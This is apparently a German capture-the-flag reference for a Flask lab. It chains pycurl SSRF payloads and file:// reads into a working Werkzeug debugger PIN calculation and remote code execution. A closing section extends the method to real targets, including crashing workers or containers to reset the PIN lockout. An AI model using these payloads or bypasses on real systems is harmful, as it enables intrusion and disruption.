# PlantPhoto Hunt — Technische Referenz

## Ziel-Architektur

```
┌──────────────────────────────────────────────────┐
│ Docker Container (Alpine Linux)                  │
│                                                  │
│   Flask App (app.py)                             │
│   ├── Werkzeug/0.16.0 + Python 3.10.7           │
│   ├── pycurl für /download-Requests              │
│   ├── debug=True → /console verfügbar            │
│   └── Port 8087 (intern)                         │
│                                                  │
│   Container ID: 77c09e05c4a9...                  │
│   MAC: 02:42:ac:14:00:02                         │
└──────────────────────────────────────────────────┘
       ↑
  Target-IP:80  (Port-Mapping 80 → 8087)
```

---

## Endpoint-Referenz

| Endpoint | Methode | Beschreibung |
|----------|---------|--------------|
| `/` | GET | Homepage mit Botanik-Portfolio |
| `/admin` | GET | Admin-Panel, nur von `127.0.0.1` erreichbar |
| `/download?server=<host>&id=<num>` | GET | Lädt PDF von externem Server — **SSRF-Vektor** |
| `/public-docs-k057230990384293/<path>` | GET | Statische Dateien |
| `/console` | GET | Werkzeug Interactive Debugger (wenn `debug=True`) |

---

## SSRF-Schwachstelle im Detail

### URL-Konstruktion

```python
# Aus app.py (vereinfacht)
url = f"http://{server}/public-docs-k057230990384293/{id}.pdf"
c = pycurl.Curl()
c.setopt(c.URL, url)
c.setopt(c.HTTPHEADER, ['X-API-KEY: THM{Hello_Im_just_an_API_key}'])
c.perform()
```

### Protokoll-Support (pycurl)

pycurl unterstützt zahlreiche Protokolle:

| Protokoll | Payload (server=) | Nutzen |
|-----------|--------------------|--------|
| `http://` | `127.0.0.1:8087/admin%23` | SSRF zu Localhost-Diensten |
| `file://` | `file:///etc/passwd?` | Lokale Dateien lesen |
| `gopher://` | `gopher://127.0.0.1:PORT/...` | Low-Level TCP (nicht getestet) |
| `dict://` | `dict://127.0.0.1:PORT/...` | Service-Probing (nicht getestet) |

### Pfad-Abschneidung

Das Problem: pycurl hängt `/public-docs-k057230990984293/{id}.pdf` an die URL an.

**Lösung 1: `#` (Fragment)**
```
server=http://127.0.0.1:8087/admin%23
→ pycurl requestet: http://127.0.0.1:8087/admin#/public-docs.../1.pdf
→ Fragment wird ignoriert → nur /admin wird aufgerufen
```

**Lösung 2: `?` (Query)**
```
server=file:///usr/src/app/app.py?
→ pycurl requestet: file:///usr/src/app/app.py?/public-docs.../1.pdf
→ Bei file:// wird der Query-Teil ignoriert → Datei wird gelesen
```

---

## Werkzeug 0.16.0 PIN-Algorithmus

### Übersicht

Werkzeug generiert beim Start einen **deterministischen PIN** basierend auf Systemwerten. Wer diese Werte kennt, kann den PIN berechnen.

### Benötigte Werte

#### Public Bits

| Variable | Beschreibung | Wert (Ziel) | Quelle |
|----------|-------------|-------------|--------|
| `username` | Prozess-Owner | `root` | `/etc/passwd` via file:// SSRF |
| `modname` | Modulname | `flask.app` | Immer `flask.app` |
| `getattr(app, '__name__', type(app).__name__)` | App-Klasse | `Flask` | Immer `Flask` |
| `getattr(mod, '__file__', None)` | Pfad zum Modul | `/usr/local/lib/python3.10/site-packages/flask/app.py` | Aus Traceback-Seite |

#### Private Bits

| Variable | Beschreibung | Wert (Ziel) | Quelle |
|----------|-------------|-------------|--------|
| `str(uuid.getnode())` | MAC als Integer | `2485378088962` | `/sys/class/net/eth0/address` via file:// → `02:42:ac:14:00:02` → `int("0242ac140002", 16)` |
| `get_machine_id()` | Machine-ID | `77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca` | `/proc/self/cgroup` via file:// |

### Machine-ID Ermittlung (Docker-Spezifik)

Werkzeug 0.16.0 `get_machine_id()` Algorithmus:

```python
def get_machine_id():
    # 1. Versuche /proc/self/cgroup zu lesen
    #    Erste Zeile: "12:devices:/docker/77c09e05c4a9..."
    #    → .partition('/docker/')[2] → Container-ID
    
    # 2. Falls kein Docker:
    #    /etc/machine-id oder /proc/sys/kernel/random/boot_id
    
    # 3. macOS: ioreg
```

**Kritisch:** In Docker-Containern wird die **Container-ID** verwendet, nicht `/etc/machine-id`!

### PIN-Berechnung (Python)

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'root',                    # username
    'flask.app',               # modname  
    'Flask',                   # getattr(app, '__name__')
    '/usr/local/lib/python3.10/site-packages/flask/app.py'  # mod.__file__
]

private_bits = [
    '2485378088962',           # str(uuid.getnode()) - MAC als int
    '77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca'  # machine_id
]

h = hashlib.md5()    # ← Werkzeug 0.16.0 nutzt MD5 (ab 2.x = SHA1!)
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)

h.update(b"cookiesalt")    # Cookie-Salt
# cookie_name = "__wzd" + h.hexdigest()[:20]

num = None
for num_type in "pin", None:
    h.update(b"pinsalt")   # Pin-Salt
    num = ("%09d" % int(h.hexdigest(), 16))[:9]

pin = f"{num[:3]}-{num[3:6]}-{num[6:]}"
# Ergebnis: 110-688-511
```

### PIN-Authentifizierung

```python
# Secret von der /console-Seite extrahieren (im HTML: SECRET = "...")
# GET /console?__debugger__=yes&cmd=pinauth&pin={PIN}&s={SECRET}
# → Response: {"auth": true, "exhausted": false} bei Erfolg
```

**Achtung:** Nach ~10 Fehl-Versuchen wird der PIN als „exhausted" markiert. Nur ein Neustart des Containers setzt dies zurück.
Im Realfall gibt es mehrere Optionen:

Warten. Manche Werkzeug-Versionen setzen den Lockout nach einer bestimmten Zeit zurück (z.B. nach ein paar Stunden). Das ist aber versionsabhängig und in 0.16 nicht der Fall.

Neuen Worker/Prozess triggern. Wenn die App hinter einem WSGI-Server (gunicorn, uwsgi) mit mehreren Worker-Prozessen läuft, hat jeder Worker seinen eigenen PIN und eigenen Exhaustion-Counter. Durch gezieltes Crashen eines Workers (z.B. via Memory-Exhaustion, große Uploads, rekursive Requests) kann der Supervisor einen neuen Worker spawnen → frischer PIN + kein Lockout.

PIN-Exhaustion umgehen via Cookie. Wenn du den PIN einmal richtig hattest und den __wzd...-Cookie gespeichert hast, brauchst du den PIN nicht nochmal — der Cookie authentifiziert direkt. Der Lockout betrifft nur die pinauth-Route, nicht den Cookie-Check.

Anderen Angriffsvektor nutzen. Da du bereits -SSRF hast, kannst du RCE auch ohne den Debugger erreichen:

Werkzeug Secret + Cookie forgen: Mit dem berechneten Secret den __wzd-Cookie selbst generieren (HMAC aus dem gleichen PIN-Material) und den PIN-Dialog komplett umgehen
Andere Dateien schreiben: Via gopher:// oder andere pycurl-Protokolle ggf. eine .py-Datei überschreiben
Scheduled Tasks / Cronjobs in /etc/crontabs/ lesen und ggf. ausnutzen
DoS + Auto-Restart. Wenn der Container von Docker/K8s mit Restart-Policy läuft (--restart=always), kann ein gezielter Crash (OOM, Segfault via pycurl-Exploit) den Container neu starten → neuer PIN, kein Lockout.

TL;DR: In der Praxis ist der Exhaustion-Schutz schwach, weil er pro Prozess gilt und durch Worker-Recycling, Cookie-Forging oder Container-Restarts umgangen werden kann.
---

## Dateien auf dem Ziel-Server

```
/usr/src/app/
├── app.py                          # Flask-Anwendung
├── Dockerfile                      # Container-Definition
├── requirements.txt                # Python-Dependencies
├── flag-982374827648721338.txt     # Flag 3 (randomisierter Name!)
├── templates/                      # Jinja2-Templates
├── public-docs/                    # Öffentliche Dokumente
├── private-docs/                   # Admin-Bereich (flag.pdf)
└── static/                         # Statische Assets
```

---

## Nützliche file:// SSRF-Ziele

| Pfad | Information |
|------|-------------|
| `/usr/src/app/app.py` | Kompletter Quellcode der App |
| `/etc/passwd` | Benutzer → Username für PIN |
| `/sys/class/net/eth0/address` | MAC-Adresse → `uuid.getnode()` |
| `/proc/self/cgroup` | Docker Container-ID → `machine_id` |
| `/proc/self/environ` | Umgebungsvariablen |
| `/proc/self/cmdline` | Gestarteter Befehl |
| `/etc/machine-id` | Machine-ID (nicht in Docker!) |
| `/proc/sys/kernel/random/boot_id` | Boot-ID (Fallback) |
| `/usr/local/lib/python3.10/site-packages/werkzeug/debug/__init__.py` | Werkzeug-Quellcode mit PIN-Algorithmus |

---

## Versionsunterschiede Werkzeug PIN

| Version | Hash | machine_id Quelle (Docker) | Salts |
|---------|------|----------------------------|-------|
| **0.16.x** | **MD5** | `/proc/self/cgroup` → Container-ID | `cookiesalt`, `pinsalt` |
| 2.x+ | SHA1 | `/proc/self/cgroup` + `/etc/machine-id` concat | `cookiesalt`, `pinsalt` |

---

## Attack-Chain Zusammenfassung

```
                      ┌── Flag 1: SSRF → Listener (API-Key in Header)
                      │
SSRF (/download) ─────┼── Flag 2: SSRF → http://127.0.0.1:8087/admin%23
                      │
                      └── Flag 3: SSRF → file:// Reads
                                          ↓
                                  Werkzeug PIN Values
                                          ↓
                                  PIN Berechnung (MD5)
                                          ↓
                                  /console Auth (pinauth)
                                          ↓
                                  RCE → os.listdir() → open()
                                          ↓
                                  flag-982374827648721338.txt
```

---

## Quellen

- [Werkzeug Debugger PIN Exploit — HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug)
- [pycurl Protokoll-Support](http://pycurl.io/docs/latest/)
- [SSRF Testing — OWASP](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
